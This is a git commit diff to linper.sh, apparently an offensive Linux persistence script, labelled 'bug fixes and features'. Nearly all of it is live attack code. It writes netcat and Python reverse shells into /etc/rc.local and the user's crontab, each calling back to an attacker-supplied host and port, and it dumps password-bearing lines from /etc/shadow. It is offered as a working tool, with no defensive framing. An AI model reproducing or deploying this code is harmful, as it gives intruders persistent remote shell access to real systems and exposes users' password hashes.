9e310626beb841350a7aa60edaae98ab97623f8c
montyonsecurity <jacobcainmontgomery@gmail.com>
2019-12-09 17:59:58 -0500

    bug fixes and features

--- linper.sh
+++ linper.sh
@@ -63,41 +63,41 @@ fi
 
 if [[ $root == "yes" ]];
 then
+	if [[ $rclocal == "no" ]];
+	then
+		echo "/bin/sh -e" > /etc/rc.local
+		rclocal=yes
+	fi
 	if [[ $rclocal == "yes" ]];
 	then
 		grep -v "exit 0" /etc/rc.local > /dev/shm/rc.local.tmp
-		mv /dev/shm/rc.local.tmp /etc/rc.local
-		rclocal=no
-	fi
-	if [[ $rclocal == "no" ]];
-	then
 		if [[ $python == "yes" ]];
 		then
 			if [[ $python == $nc ]];
 			then
-				echo "/bin/sh -e" > /etc/rc.local
-				echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> /etc/rc.local
-				echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /etc/rc.local
-				echo "exit 0" >> /etc/rc.local
+				echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> /dev/shm/rc.local.tmp
+				echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /dev/shm/rc.local.tmp
+				mv /dev/shm/rc.local.tmp /etc/rc.local
 				echo -e "\e[92m[+]\e[0m Netcat reverse shell placed in /etc/rc.local"
 				echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort"
 				echo -e "\e[92m[+]\e[0m Python reverse shell placed in /etc/rc.local"
 				echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort"
 			elif [[ $python != $nc ]];
 			then
-				echo "/bin/sh -e" > /etc/rc.local
-				echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /etc/rc.local
-				echo "exit 0" >> /etc/rc.local
+				echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /dev/shm/rc.local.tmp
+				mv /dev/shm/rc.local.tmp /etc/rc.local
 				echo -e "\e[92m[+]\e[0m Python reverse shell placed in /etc/rc.local"
 				echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort"
 			fi
 		elif [[ $nc == "yes" ]];
 		then
-			echo "/bin/sh -e\nnc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001\nexit 0" > /etc/rc.local
+			echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" > /dev/shm/rc.local.tmp
+			mv /dev/shm/rc.local.tmp /etc/rc.local
 			echo -e "\e[92m[+]\e[0m Netcat reverse shell placed in /etc/rc.local"
 			echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort"
 		fi
 	fi
+	echo "exit 0" >> /etc/rc.local
 	chmod +x /etc/rc.local
 	echo -e "\e[92m[+]\e[0m Users with passwords from the shadow file"
 	egrep -v "\*|\!" /etc/shadow
@@ -105,17 +105,20 @@ fi
 
 if [[ $crontab == "yes" ]];
 then
-	crontab -l > /dev/shm/.cron.sh
+	crontab -l 2> /dev/null > /dev/shm/.cron.sh
 	if [[ $python == "yes" ]];
 	then
 		echo "$cron python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\nexit 0" >> /dev/shm/.cron.sh
+		crontab /dev/shm/.cron.sh
+		echo -e "\e[92m[+]\e[0m Python reverse shell loaded in crontab"
+		echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort on a $cron schedule"
 	fi
 	if [[ $nc == "yes" ]];
 	then
 		echo "$cron nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> /dev/shm/.cron.sh
+		echo -e "\e[92m[+]\e[0m Netcat reverse shell loaded in crontab"
+		echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort on a $cron schedule"
+		crontab /dev/shm/.cron.sh
 	fi
-	crontab /dev/shm/.cron.sh
 	rm /dev/shm/.cron.sh
-	echo -e "\e[92m[+]\e[0m This is the crontab you just installed for $(whoami)"
-	crontab -l
 fi
